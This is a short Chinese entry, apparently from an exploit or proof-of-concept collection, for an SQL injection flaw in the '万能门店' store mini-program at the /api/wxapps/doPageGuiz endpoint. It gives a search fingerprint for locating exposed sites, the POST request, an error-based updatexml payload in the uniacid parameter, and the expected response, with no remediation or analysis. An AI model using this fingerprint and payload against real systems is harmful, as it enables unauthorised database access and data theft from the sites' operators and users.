# 万能门店小程序doPageGuiz存在sql注入漏洞

万能门店小程序 ｜ SQL注入 ｜ —
- **指纹**：`body="/comhome/cases/index.html"`
- **请求**：`POST /api/wxapps/doPageGuiz HTTP/1.1`

**Payload**
```
suid=1&uniacid=1 and updatexml(1,concat(0x7e,(select md5('123123')),0x7e),1)--+
```
- **响应特征**：200